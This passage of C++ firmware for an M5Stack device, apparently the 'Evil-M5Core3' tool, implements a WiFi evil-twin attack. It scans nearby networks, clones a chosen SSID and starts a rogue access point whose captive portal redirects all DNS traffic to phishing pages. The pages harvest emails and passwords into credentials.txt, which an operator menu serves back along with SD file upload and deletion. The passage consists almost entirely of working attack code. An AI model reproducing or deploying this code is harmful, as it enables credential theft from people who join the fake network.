  for (int i = 0; i < 10; i++) {
    if (macAddresses[i] != "") {
      status += macAddresses[i] + "\n";
    }
  }
  status += "Stack left: " + getStack() + " Kb\n";
  status += "RAM: " + getRamUsage() + " Mo\n";
  status += "Battery: " + getBatteryLevel() + "%\n"; // thx to kdv88 to pointing this correction
  status += "Temperature: " + getTemperature() + "C\n";
  return status;
}



void checkCredentialsSerial() {
  File file = SD.open("/credentials.txt");
  if (!file) {
    Serial.println("Failed to open credentials file");
    return;
  }
  bool isEmpty = true;
  Serial.println("----------------------");
  Serial.println("Credentials Found:");
  Serial.println("----------------------");
  //sendBLE("----------------------");
  //sendBLE("Credentials Found:");
  //sendBLE("----------------------");
  while (file.available()) {
    String line = file.readStringUntil('\n');
    if (line.length() > 0) {
      Serial.println(line);
      //sendBLE(line);
      isEmpty = false;
    }
  }
  file.close();
  if (isEmpty) {
    Serial.println("No credentials found.");
    //sendBLE("No credentials found.");
  }
}

void changePortal(int index) {
  File root = SD.open("/sites");
  int currentIndex = 0;
  String selectedFile;
  while (File file = root.openNextFile()) {
    if (currentIndex == index) {
      selectedFile = String(file.name());
      break;
    }
    currentIndex++;
    file.close();
  }
  root.close();
  if (selectedFile.length() > 0) {
    Serial.println("Changing portal to: " + selectedFile);
    //sendBLE("Changing portal to: " + selectedFile);
    selectedPortalFile = "/sites/" + selectedFile;
  } else {
    Serial.println("Invalid portal index");
  }
}

void selectNetwork(int index) {
  if (index >= 0 && index < numSsid) {
    currentlySelectedSSID = ssidList[index];
    Serial.println("SSID sélectionné: " + currentlySelectedSSID);
  } else {
    Serial.println("Index SSID invalide.");
  }
}

void scanWifiNetworks() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  unsigned long startTime = millis();
  int n;
  while (millis() - startTime < 5000) {
    M5.Display.clear();
    M5.Display.fillRect(0, M5.Display.height() - 20, M5.Display.width(), 20, TFT_BLACK);
    M5.Display.setCursor(50 , M5.Display.height() / 2 );
    M5.Display.print("Scan in progress... ");
    Serial.println("-------------------");
    Serial.println("WiFi Scan in progress... ");
    M5.Display.display();
    n = WiFi.scanNetworks();
    if (n != WIFI_SCAN_RUNNING) break;
  }
  Serial.println("-------------------");
  Serial.println("Near Wifi Network : ");
  numSsid = min(n, 100);
  for (int i = 0; i < numSsid; i++) {
    ssidList[i] = WiFi.SSID(i);
    Serial.print(i);
    Serial.print(": ");
    Serial.println(ssidList[i]);
  }
  Serial.println("-------------------");
  Serial.println("WiFi Scan Completed ");
  Serial.println("-------------------");
  waitAndReturnToMenu("Scan Completed");

}

void showWifiList() {
  const int listDisplayLimit = M5.Display.height() / 18; // Nombre d'éléments affichés à la fois
  int listStartIndex = max(0, min(currentListIndex, numSsid - listDisplayLimit));
  static bool isTouchHandled = false; // Pour s'assurer d'un seul changement par touché

  M5.Display.clear();
  M5.Display.setTextSize(2);
  for (int i = listStartIndex; i < min(numSsid, listStartIndex + listDisplayLimit); i++) {
    if (i == currentListIndex) {
      M5.Display.fillRect(0, (i - listStartIndex) * 18, M5.Display.width(), 18, TFT_NAVY);
      M5.Display.setTextColor(TFT_GREEN);
    } else {
      M5.Display.setTextColor(TFT_WHITE);
    }
    M5.Display.setCursor(10, (i - listStartIndex) * 18);
    M5.Display.println(ssidList[i]);
  }
  M5.Display.display();

  while (!inMenu) {
    M5.update();

    int largeurZone = M5.Display.width() / 3; // Divise l'écran en trois zones verticales
    if (M5.Touch.getCount() && !isTouchHandled) {
      auto touch = M5.Touch.getDetail(); // Obtient le détail du premier toucher

      // Zone gauche pour monter dans la liste
      if (touch.x < largeurZone) {
        currentListIndex--;
        if (currentListIndex < 0) currentListIndex = numSsid - 1;
        isTouchHandled = true; // Empêche les changements supplémentaires jusqu'au prochain toucher
        // Réaffiche la liste après un changement
        showWifiList();
      }
      // Zone droite pour descendre dans la liste
      else if (touch.x >= 2 * largeurZone) {
        currentListIndex++;
        if (currentListIndex >= numSsid) currentListIndex = 0;
        isTouchHandled = true;
        // Réaffiche la liste après un changement
        showWifiList();
      }
      // Zone centrale pour sélectionner un SSID
      else if (touch.x >= largeurZone && touch.x < 2 * largeurZone) {
        if (touch.wasClicked()) {
          inMenu = true;
          Serial.println("-------------------");
          Serial.println("SSID " + ssidList[currentListIndex] + " selected");
          Serial.println("-------------------");
          // Fonction hypothétique pour gérer la sélection et retourner au menu
          waitAndReturnToMenu(ssidList[currentListIndex] + "\n      selected");
          isTouchHandled = true;
        }
      }
    } else if (!M5.Touch.getCount()) {
      isTouchHandled = false; // Réinitialise le contrôle du toucher lorsque l'écran n'est pas touché
    }

    handleDnsRequestSerial(); // Continuez à gérer d'autres tâches si nécessaire
  }
}

void showWifiDetails(int &networkIndex) {
  inMenu = false;
  static bool isTouchHandled = false; // Pour s'assurer d'un seul changement par touché

  auto updateDisplay = [&]() {
    if (networkIndex >= 0 && networkIndex < numSsid) {
      M5.Display.clear();
      M5.Display.setTextSize(2);
      int y = 10;

      // SSID
      M5.Display.setCursor(10, y);
      M5.Display.println("SSID: " + (ssidList[networkIndex].length() > 0 ? ssidList[networkIndex] : "N/A"));
      y += 40;

      // Channel
      int channel = WiFi.channel(networkIndex);
      M5.Display.setCursor(10, y);
      M5.Display.println("Channel: " + (channel > 0 ? String(channel) : "N/A"));
      y += 20;

      // Security
      String security = getWifiSecurity(networkIndex);
      M5.Display.setCursor(10, y);
      M5.Display.println("Security: " + (security.length() > 0 ? security : "N/A"));
      y += 20;

      // Signal Strength
      int32_t rssi = WiFi.RSSI(networkIndex);
      M5.Display.setCursor(10, y);
      M5.Display.println("Signal: " + (rssi != 0 ? String(rssi) + " dBm" : "N/A"));
      y += 20;

      // MAC Address
      uint8_t* bssid = WiFi.BSSID(networkIndex);
      String macAddress = bssidToString(bssid);
      M5.Display.setCursor(10, y);
      M5.Display.println("MAC: " + (macAddress.length() > 0 ? macAddress : "N/A"));
      y += 20;

      M5.Display.setCursor(35, 220);
      M5.Display.println("Next");
      M5.Display.setCursor(140, 220);
      M5.Display.println("Back");
      M5.Display.setCursor(238, 220);
      M5.Display.println("Clone");

      M5.Display.display();
      Serial.println("------Wifi-Info----");
      Serial.println("SSID: " + ssidList[networkIndex]);
      Serial.println("Channel: " + String(WiFi.channel(networkIndex)));
      Serial.println("Security: " + security);
      Serial.println("Signal: " + String(rssi) + " dBm");
      Serial.println("MAC: " + macAddress);
      Serial.println("-------------------");
    }

  };

  updateDisplay();
  while (!inMenu) {
    M5.update();

    int largeurZone = M5.Display.width() / 3; // Largeur de chaque zone tactile

    if (M5.Touch.getCount() && !isTouchHandled) { // Vérifie s'il y a un toucher et si le dernier toucher a été géré
      auto touch = M5.Touch.getDetail(); // Détail du premier toucher

      // Zone gauche pour le prochain réseau
      if (touch.x < largeurZone) {
        networkIndex = (networkIndex + 1) % numSsid;
        updateDisplay();
        isTouchHandled = true; // Marque le toucher comme géré
      }
      // Zone droite pour le clonage du réseau
      else if (touch.x >= 2 * largeurZone) {
        cloneSSIDForCaptivePortal(ssidList[networkIndex]);
        inMenu = true;
        waitAndReturnToMenu(ssidList[networkIndex] + " Cloned...");
        Serial.println(ssidList[networkIndex] + " Cloned...");
        drawMenu();
        isTouchHandled = true; // Marque le toucher comme géré
      }
      // Zone centrale pour retourner au menu
      else if (touch.x >= largeurZone && touch.x < 2 * largeurZone) {
        inMenu = true;
        drawMenu();
        isTouchHandled = true; // Marque le toucher comme géré
        break;
      }
    } else if (M5.Touch.getCount() == 0) {
      isTouchHandled = false; // Réinitialise le suivi du toucher lorsque tous les touchers sont relâchés
    }
  }
}



String getWifiSecurity(int networkIndex) {
  switch (WiFi.encryptionType(networkIndex)) {
    case WIFI_AUTH_OPEN:
      return "Open";
    case WIFI_AUTH_WEP:
      return "WEP";
    case WIFI_AUTH_WPA_PSK:
      return "WPA_PSK";
    case WIFI_AUTH_WPA2_PSK:
      return "WPA2_PSK";
    case WIFI_AUTH_WPA_WPA2_PSK:
      return "WPA_WPA2_PSK";
    case WIFI_AUTH_WPA2_ENTERPRISE:
      return "WPA2_ENTERPRISE";
    default:
      return "Unknown";
  }
}

String bssidToString(uint8_t* bssid) {
  char mac[18];
  snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
           bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
  return String(mac);
}

void cloneSSIDForCaptivePortal(String ssid) {
  clonedSSID = ssid;
}

void createCaptivePortal() {
  String ssid = clonedSSID.isEmpty() ? "Evil-M5Core3" : clonedSSID;
  WiFi.mode(WIFI_MODE_APSTA);
  if (!isAutoKarmaActive) {
    if (captivePortalPassword == "") {
      WiFi.softAP(clonedSSID.c_str());
    } else {
      WiFi.softAP(clonedSSID.c_str(), captivePortalPassword.c_str());
    }

  }

  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
  isCaptivePortalOn = true;

  server.on("/", HTTP_GET, []() {
    String email = server.arg("email");
    String password = server.arg("password");
    if (!email.isEmpty() && !password.isEmpty()) {
      saveCredentials(email, password, selectedPortalFile.substring(7), clonedSSID); // Assurez-vous d'utiliser les bons noms de variables
      server.send(200, "text/plain", "Credentials Saved");
    } else {
      Serial.println("-------------------");
      Serial.println("Direct Web Access !!!");
      Serial.println("-------------------");
      servePortalFile(selectedPortalFile);
    }
  });


  server.on("/evil-m5core2-menu", HTTP_GET, []() {
    String html = "<!DOCTYPE html><html><head><style>";
    html += "body{font-family:sans-serif;background:#f0f0f0;padding:40px;display:flex;justify-content:center;align-items:center;height:100vh}";
    html += "form{text-align:center;}div.menu{background:white;padding:20px;box-shadow:0 4px 8px rgba(0,0,0,0.1);border-radius:10px}";
    html += " input,a{margin:10px;padding:8px;width:80%;box-sizing:border-box;border:1px solid #ddd;border-radius:5px}";
    html += " a{display:inline-block;text-decoration:none;color:white;background:#007bff;text-align:center}";
    html += "</style></head><body>";
    html += "<div class='menu'><form action='/evil-m5core2-menu' method='get'>";
    html += "Password: <input type='password' name='pass'><br>";
    html += "<a href='javascript:void(0);' onclick='this.href=\"/credentials?pass=\"+document.getElementsByName(\"pass\")[0].value'>Credentials</a>";
    html += "<a href='javascript:void(0);' onclick='this.href=\"/uploadhtmlfile?pass=\"+document.getElementsByName(\"pass\")[0].value'>Upload File On SD</a>";
    html += "<a href='javascript:void(0);' onclick='this.href=\"/check-sd-file?pass=\"+document.getElementsByName(\"pass\")[0].value'>Check SD File</a>";
    html += "<a href='javascript:void(0);' onclick='this.href=\"/Change-Portal-Password?pass=\"+document.getElementsByName(\"pass\")[0].value'>Change WPA Password</a>";
    html += "</form></div></body></html>";
    server.send(200, "text/html", html);
    Serial.println("-------------------");
    Serial.println("evil-m5core2-menu access.");
    Serial.println("-------------------");
  });

  server.on("/credentials", HTTP_GET, []() {
    String password = server.arg("pass");
    if (password == accessWebPassword) {
      File file = SD.open("/credentials.txt");
      if (file) {
        if (file.size() == 0) {
          server.send(200, "text/html", "<html><body><p>No credentials...</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
        } else {
          server.streamFile(file, "text/plain");
        }
        file.close();
      } else {
        server.send(404, "text/html", "<html><body><p>File not found.</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
      }
    } else {
      server.send(403, "text/html", "<html><body><p>Unauthorized.</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
    }
  });


  server.on("/check-sd-file", HTTP_GET, handleSdCardBrowse);
  server.on("/download-sd-file", HTTP_GET, handleFileDownload);
  server.on("/list-directories", HTTP_GET, handleListDirectories);

  server.on("/uploadhtmlfile", HTTP_GET, []() {
    if (server.arg("pass") == accessWebPassword) {
      String password = server.arg("pass");
      String html = "<!DOCTYPE html><html><head>";
      html += "<meta charset='UTF-8'>";
      html += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
      html += "<title>Upload File</title></head>";
      html += "<body><div class='container'>";
      html += "<form id='uploadForm' method='post' enctype='multipart/form-data'>";
      html += "<input type='file' name='file' accept='*/*'>";
      html += "Select directory: <select id='dirSelect' name='directory'>";
      html += "<option value='/'>/</option>";
      html += "</select><br>";
      html += "<input type='submit' value='Upload file'>";
      html += "</form>";
      html += "<script>";
      html += "window.onload = function() {";
      html += "    var passValue = '" + password + "';";
      html += "    var dirSelect = document.getElementById('dirSelect');";
      html += "    fetch('/list-directories?pass=' + encodeURIComponent(passValue))";
      html += "        .then(response => response.text())";
      html += "        .then(data => {";
      html += "            const dirs = data.split('\\n');";
      html += "            dirs.forEach(dir => {";
      html += "                if (dir.trim() !== '') {";
      html += "                    var option = document.createElement('option');";
      html += "                    option.value = dir;";
      html += "                    option.textContent = dir;";
      html += "                    dirSelect.appendChild(option);";
      html += "                }";
      html += "            });";
      html += "        })";
      html += "        .catch(error => console.error('Error:', error));";
      html += "    var form = document.getElementById('uploadForm');";
      html += "    form.onsubmit = function(event) {";
      html += "        event.preventDefault();";
      html += "        var directory = dirSelect.value;";
      html += "        form.action = '/upload?pass=' + encodeURIComponent(passValue) + '&directory=' + encodeURIComponent(directory);";
      html += "        form.submit();";
      html += "    };";
      html += "};";
      html += "</script>";
      html += "<style>";
      html += "body,html{height:100%;margin:0;display:flex;justify-content:center;align-items:center;background-color:#f5f5f5}select {padding: 10px; margin-bottom: 10px; border-radius: 5px; border: 1px solid #ddd; width: 92%; background-color: #fff; color: #333;}.container{width:50%;max-width:400px;min-width:300px;padding:20px;background:#fff;box-shadow:0 4px 8px rgba(0,0,0,.1);border-radius:10px;display:flex;flex-direction:column;align-items:center}form{width:100%}input[type=file],input[type=submit]{width:92%;padding:10px;margin-bottom:10px;border-radius:5px;border:1px solid #ddd}input[type=submit]{background-color:#007bff;color:#fff;cursor:pointer;width:100%}input[type=submit]:hover{background-color:#0056b3}@media (max-width:600px){.container{width:80%;min-width:0}}";
      html += "</style></body></html>";

      server.send(200, "text/html", html);
    } else {
      server.send(403, "text/html", "<html><body><p>Unauthorized.</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
    }
  });



  server.on("/upload", HTTP_POST, []() {
    server.send(200);
  }, handleFileUpload);

  server.on("/delete-sd-file", HTTP_GET, handleFileDelete);

  server.on("/Change-Portal-Password", HTTP_GET, handleChangePassword);


  server.onNotFound([]() {
    Serial.println("-------------------");
    Serial.println("Portal Web Access !!!");
    Serial.println("-------------------");
    //sendBLE("-------------------");
    //sendBLE("Portal Web Access !!!");
    //sendBLE("-------------------");

    servePortalFile(selectedPortalFile);
  });

  server.begin();
  Serial.println("-------------------");
  Serial.println("Portal " + ssid + " Deployed with " + selectedPortalFile.substring(7) + " Portal !");
  Serial.println("-------------------");
  if (ledOn) {
    pixels.setPixelColor(4, pixels.Color(255, 0, 0));
    pixels.setPixelColor(5, pixels.Color(255, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(3, pixels.Color(255, 0, 0));
    pixels.setPixelColor(6, pixels.Color(255, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(4, pixels.Color(0, 0, 0));
    pixels.setPixelColor(5, pixels.Color(0, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(2, pixels.Color(255, 0, 0));
    pixels.setPixelColor(7, pixels.Color(255, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(3, pixels.Color(0, 0, 0));
    pixels.setPixelColor(6, pixels.Color(0, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(1, pixels.Color(255, 0, 0));
    pixels.setPixelColor(8, pixels.Color(255, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(2, pixels.Color(0, 0, 0));
    pixels.setPixelColor(7, pixels.Color(0, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(0, pixels.Color(255, 0, 0));
    pixels.setPixelColor(9, pixels.Color(255, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(1, pixels.Color(0, 0, 0));
    pixels.setPixelColor(8, pixels.Color(0, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(0, pixels.Color(0, 0, 0));
    pixels.setPixelColor(9, pixels.Color(0, 0, 0));
    pixels.show();
    delay(50);
  }
  if (!isProbeKarmaAttackMode && !isAutoKarmaActive) {
    waitAndReturnToMenu("     Portal\n        " + ssid + "\n        Deployed");
  }
}


String getDirectoryHtml(File dir, String path, String password) {
  String html = "<!DOCTYPE html><html><head><style>";
  html += "body{font-family:sans-serif;background:#f0f0f0;padding:20px}";
  html += "ul{list-style-type:none;padding:0}";
  html += "li{margin:10px 0;padding:5px;background:white;border:1px solid #ddd;border-radius:5px}";
  html += "a{color:#007bff;text-decoration:none}";
  html += "a:hover{color:#0056b3}";
  html += ".red{color:red}";
  html += "</style></head><body><ul>";
  if (path != "/") {
    String parentPath = path.substring(0, path.lastIndexOf('/'));
    if (parentPath == "") parentPath = "/";
    html += "<li><a href='/check-sd-file?dir=" + parentPath + "&pass=" + password + "'>[Up]</a></li>";
  }

  while (File file = dir.openNextFile()) {
    String fileName = String(file.name());
    String displayFileName = fileName;
    if (path != "/" && fileName.startsWith(path)) {
      displayFileName = fileName.substring(path.length());
      if (displayFileName.startsWith("/")) {
        displayFileName = displayFileName.substring(1);
      }
    }

    String fullPath = path + (path.endsWith("/") ? "" : "/") + displayFileName;
    if (!fullPath.startsWith("/")) {
      fullPath = "/" + fullPath;
    }

    if (file.isDirectory()) {
      html += "<li>Directory: <a href='/check-sd-file?dir=" + fullPath + "&pass=" + password + "'>" + displayFileName + "</a></li>";
    } else {
      html += "<li>File: <a href='/download-sd-file?filename=" + fullPath + "&pass=" + password + "'>" + displayFileName + "</a> (" + String(file.size()) + " bytes) <a href='#' onclick='confirmDelete(\"" + fullPath + "\")' style='color:red;'>Delete</a></li>";
    }
    file.close();
  }
  html += "</ul>";

  html += "<script>"
          "function confirmDelete(filename) {"
          "  if (confirm('Are you sure you want to delete ' + filename + '?')) {"
          "    window.location.href = '/delete-sd-file?filename=' + filename + '&pass=" + password + "';"
          "  }"
          "}"
          "window.onload = function() {const urlParams = new URLSearchParams(window.location.search);if (urlParams.has('refresh')) {urlParams.delete('refresh');history.pushState(null, '', location.pathname + '?' + urlParams.toString());window.location.reload();}};"
          "</script>";

  return html;
}


void handleSdCardBrowse() {
  String password = server.arg("pass");
  if (password != accessWebPassword) {
    server.send(403, "text/html", "<html><body><p>Unauthorized</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
    return;
  }

  String dirPath = server.arg("dir");
  if (dirPath == "") dirPath = "/";

  File dir = SD.open(dirPath);
  if (!dir || !dir.isDirectory()) {
    server.send(404, "text/html", "<html><body><p>Directory not found.</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
    return;
  }


  String html = "<p><a href='/evil-m5core2-menu'><button style='background-color: #007bff; border: none; color: white; padding: 6px 15px; text-align: center; text-decoration: none; display: inline-block; font-size: 16px; margin: 4px 2px; cursor: pointer;'>Menu</button></a></p>";
  html += getDirectoryHtml(dir, dirPath, accessWebPassword);
  server.send(200, "text/html", html);
  dir.close();
}

void handleFileDownload() {
  String fileName = server.arg("filename");
  if (!fileName.startsWith("/")) {
    fileName = "/" + fileName;
  }
  if (SD.exists(fileName)) {
    File file = SD.open(fileName, FILE_READ);
    if (file) {
      String downloadName = fileName.substring(fileName.lastIndexOf('/') + 1);
      server.sendHeader("Content-Disposition", "attachment; filename=" + downloadName);
      server.streamFile(file, "application/octet-stream");
      file.close();
      return;
    }
  }
  server.send(404, "text/html", "<html><body><p>File not found.</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
}


void handleFileUpload() {
  HTTPUpload& upload = server.upload();
  String password = server.arg("pass");
  const size_t MAX_UPLOAD_SIZE = 8192;

  if (password != accessWebPassword) {
    Serial.println("Unauthorized access attempt");
    server.send(403, "text/html", "<html><body><p>Unauthorized</p></body></html>");
    return;
  }

  if (upload.status == UPLOAD_FILE_START) {
    String filename = upload.filename;
    String directory = server.arg("directory");

    if (!directory.startsWith("/")) {
      directory = "/" + directory;
    }

    if (!directory.endsWith("/")) {
      directory += "/";
    }

    String fullPath = directory + filename;

    fsUploadFile = SD.open(fullPath, FILE_WRITE);
    if (!fsUploadFile) {
      Serial.println("Upload start failed: Unable to open file " + fullPath);
      server.send(500, "text/html", "File opening failed");
      return;
    }

    Serial.print("Upload Start: ");
    Serial.println(fullPath);
  } else if (upload.status == UPLOAD_FILE_WRITE) {
    if (fsUploadFile && upload.currentSize > 0 && upload.currentSize <= MAX_UPLOAD_SIZE) {
      size_t written = fsUploadFile.write(upload.buf, upload.currentSize);
      if (written != upload.currentSize) {
        Serial.println("Write Error: Inconsistent data size.");
        fsUploadFile.close();
        server.send(500, "text/html", "File write error");
        return;
      }
    } else {
      if (!fsUploadFile) {
        Serial.println("Error: File is no longer valid for writing.");
      } else if (upload.currentSize > MAX_UPLOAD_SIZE) {
        Serial.println("Error: Data segment size too large.");
        Serial.println(upload.currentSize);
      } else {
        Serial.println("Information: Empty data segment received.");
      }
      return;
    }
  } else if (upload.status == UPLOAD_FILE_END) {
    if (fsUploadFile) {
      fsUploadFile.close();
      Serial.print("Upload End: ");
      Serial.println(upload.totalSize);
      server.send(200, "text/html", "<html><body><p>File successfully uploaded</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
      Serial.println("File successfully uploaded");
    } else {
      server.send(500, "text/html", "File closing error");
      Serial.println("File closing error");
    }
  }
}

void handleListDirectories() {
  String password = server.arg("pass");
  if (password != accessWebPassword) {
    server.send(403, "text/plain", "Unauthorized");
    return;
  }

  File root = SD.open("/");
  String dirList = "";

  while (File file = root.openNextFile()) {
    if (file.isDirectory()) {
      dirList += String(file.name()) + "\n";
    }
    file.close();
  }
  root.close();
  server.send(200, "text/plain", dirList);
}

void listDirectories(File dir, String path, String &output) {
  while (File file = dir.openNextFile()) {
    if (file.isDirectory()) {
      output += String(file.name()) + "\n";
      listDirectories(file, String(file.name()), output);
    }
    file.close();
  }
}


void handleFileDelete() {
  String password = server.arg("pass");
  if (password != accessWebPassword) {
    server.send(403, "text/html", "<html><body><p>Unauthorized</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
    return;
  }

  String fileName = server.arg("filename");
  if (!fileName.startsWith("/")) {
    fileName = "/" + fileName;
  }
  if (SD.exists(fileName)) {
    if (SD.remove(fileName)) {
      server.send(200, "text/html", "<html><body><p>File deleted successfully</p><script>setTimeout(function(){window.location = document.referrer + '&refresh=true';}, 2000);</script></body></html>");
      Serial.println("-------------------");
      Serial.println("File deleted successfully");
      Serial.println("-------------------");
    } else {
      server.send(500, "text/html", "<html><body><p>File could not be deleted</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
      Serial.println("-------------------");
      Serial.println("File could not be deleted");
      Serial.println("-------------------");
    }
  } else {
    server.send(404, "text/html", "<html><body><p>File not found</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
    Serial.println("-------------------");
    Serial.println("File not found");
    Serial.println("-------------------");
  }
}

void servePortalFile(const String& filename) {

  File webFile = SD.open(filename);
  if (webFile) {
    server.streamFile(webFile, "text/html");
    /*USBSerial.println("-------------------");
      Serial.println("serve portal.");
      Serial.println("-------------------");*/
    webFile.close();
  } else {
    server.send(404, "text/html", "<html><body><p>File not found</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
  }
}


void saveCredentials(const String& email, const String& password, const String& portalName, const String& clonedSSID) {
  File file = SD.open("/credentials.txt", FILE_APPEND);
  if (file) {
    file.println("-- Email -- \n" + email);
    file.println("-- Password -- \n" + password);
    file.println("-- Portal -- \n" + portalName); // Ajout du nom du portail
    file.println("-- SSID -- \n" + clonedSSID); // Ajout du SSID cloné
    file.println("----------------------");
    file.close();
    Serial.println("-------------------");
    Serial.println(" !!! Credentials " + email + ":" + password + " saved !!! ");
    Serial.println("On Portal Name: " + portalName);
    Serial.println("With Cloned SSID: " + clonedSSID);
    Serial.println("-------------------");
  } else {
    Serial.println("Error opening file for writing");
  }
}


void stopCaptivePortal() {
  dnsServer.stop();
  server.stop();
  WiFi.mode(WIFI_MODE_APSTA);
  WiFi.softAPdisconnect(true);
  isCaptivePortalOn = false;
  Serial.println("-------------------");
  Serial.println("Portal Stopped");
  Serial.println("-------------------");
  if (ledOn) {
    pixels.setPixelColor(0, pixels.Color(255, 0, 0));
    pixels.setPixelColor(9, pixels.Color(255, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(0, pixels.Color(0, 0, 0));
    pixels.setPixelColor(9, pixels.Color(0, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(1, pixels.Color(255, 0, 0));
    pixels.setPixelColor(8, pixels.Color(255, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(1, pixels.Color(0, 0, 0));
    pixels.setPixelColor(8, pixels.Color(0, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(2, pixels.Color(255, 0, 0));
    pixels.setPixelColor(7, pixels.Color(255, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(2, pixels.Color(0, 0, 0));
    pixels.setPixelColor(7, pixels.Color(0, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(3, pixels.Color(255, 0, 0));
    pixels.setPixelColor(6, pixels.Color(255, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(3, pixels.Color(0, 0, 0));
    pixels.setPixelColor(6, pixels.Color(0, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(4, pixels.Color(255, 0, 0));
    pixels.setPixelColor(5, pixels.Color(255, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(4, pixels.Color(0, 0, 0));
    pixels.setPixelColor(5, pixels.Color(0, 0, 0));
    pixels.show();
    delay(50);
  }
  waitAndReturnToMenu("  Portal Stopped");
}

void listPortalFiles() {
  File root = SD.open("/sites");
  numPortalFiles = 0;
  Serial.println("Available portals:");
  while (File file = root.openNextFile()) {
    if (!file.isDirectory()) {
      String fileName = file.name();
      // Ignore mac os file stating with ._
      if (!fileName.startsWith("._") && fileName.endsWith(".html")) {
        portalFiles[numPortalFiles] = String("/sites/") + fileName;

        Serial.print(numPortalFiles);
        Serial.print(": ");
        Serial.println(fileName);

        numPortalFiles++;
        if (numPortalFiles >= 30) break; // max 30 files
      }
    }
    file.close();
  }
  root.close();
}



void serveChangePasswordPage() {
  String password = server.arg("pass");
  if (password != accessWebPassword) {
    server.send(403, "text/html", "<html><body><p>Unauthorized</p></body></html>");
    return;
  }

  String html = "<html><head><style>";
  html += "body { background-color: #333; color: white; font-family: Arial, sans-serif; text-align: center; padding-top: 50px; }";
  html += "form { background-color: #444; padding: 20px; border-radius: 8px; display: inline-block; }";
  html += "input[type='password'], input[type='submit'] { width: 80%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; }";
  html += "input[type='submit'] { background-color: #008CBA; color: white; cursor: pointer; }";
  html += "input[type='submit']:hover { background-color: #005F73; }";
  html += "</style></head><body>";
  html += "<form action='/Change-Portal-Password-demand' method='get'>";
  html += "<input type='hidden' name='pass' value='" + password + "'>";
  html += "<h2>Change Portal Password</h2>";
  html += "New Password: <br><input type='password' name='newPassword'><br>";
  html += "<input type='submit' value='Change Password'>";
  html += "</form><br>Leave empty for an open AP.<br>Remember to deploy the portal again after changing the password.<br></body></html>";
  server.send(200, "text/html", html);
}



void handleChangePassword() {
  server.on("/Change-Portal-Password-demand", HTTP_GET, []() {
    String password = server.arg("pass");
    if (password != accessWebPassword) {
      server.send(403, "text/html", "<html><body><p>Unauthorized</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
      return;
    }

    String newPassword = server.arg("newPassword");
    captivePortalPassword = newPassword;
    server.send(200, "text/html", "<html><body><p>Password Changed Successfully !!</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
  });

  serveChangePasswordPage();
}


void changePortal() {
  listPortalFiles();
  const int listDisplayLimit = M5.Display.height() / 18;
  bool needDisplayUpdate = true;
  static bool isTouchHandled = false; // Pour suivre si le toucher a été géré
  // Attendre que l'utilisateur relâche tous les touchers avant de commencer
  while (M5.Touch.getCount() != 0) {
    M5.update();
    delay(10); // Attente courte pour laisser le temps à l'utilisateur de relâcher le toucher
  }
  while (!inMenu) {
    if (needDisplayUpdate) {
      int listStartIndex = max(0, min(portalFileIndex, numPortalFiles - listDisplayLimit));

      M5.Display.clear();
      M5.Display.setTextSize(2);
      M5.Display.setTextColor(TFT_WHITE);
      M5.Display.setCursor(10, 10);

      for (int i = listStartIndex; i < min(numPortalFiles, listStartIndex + listDisplayLimit); i++) {
        if (i == portalFileIndex) {
          M5.Display.fillRect(0, (i - listStartIndex) * 18, M5.Display.width(), 18, TFT_NAVY);
          M5.Display.setTextColor(TFT_GREEN);
        } else {
          M5.Display.setTextColor(TFT_WHITE);
        }
        M5.Display.setCursor(10, (i - listStartIndex) * 18);
        M5.Display.println(portalFiles[i].substring(7));
      }
      M5.Display.display();
      needDisplayUpdate = false;
    }

    M5.update();

    int largeurZone = M5.Display.width() / 3; // Largeur de chaque zone tactile

    if (M5.Touch.getCount()) {
      if (!isTouchHandled) {
        auto touch = M5.Touch.getDetail(); // Détail du premier toucher

        // Zone gauche pour naviguer vers le haut
        if (touch.x < largeurZone) {
          portalFileIndex = (portalFileIndex - 1 + numPortalFiles) % numPortalFiles;
          needDisplayUpdate = true;
        }
        // Zone droite pour naviguer vers le bas
        else if (touch.x >= 2 * largeurZone) {
          portalFileIndex = (portalFileIndex + 1) % numPortalFiles;
          needDisplayUpdate = true;
        }
        // Zone centrale pour sélectionner le fichier
        else if (touch.x >= largeurZone && touch.x < 2 * largeurZone) {
          selectedPortalFile = portalFiles[portalFileIndex];
          inMenu = true;
